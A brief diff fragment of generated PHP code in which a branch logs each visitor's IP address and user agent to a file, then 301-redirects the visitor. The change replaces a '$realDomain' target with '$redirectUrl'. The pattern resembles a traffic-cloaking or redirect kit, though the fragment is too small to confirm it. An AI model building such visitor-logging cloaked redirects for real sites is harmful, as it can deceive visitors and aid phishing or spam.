@@ -241,7 +241,7 @@ if (
     $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] . \' ok \' . PHP_EOL;
     fwrite($fAgent, $agent);
     fclose($fAgent);
-    header(\'Location: ' . $realDomain . '\', true, 301);
+    header(\'Location: ' . $redirectUrl . '\', true, 301);
     die();
 }
 
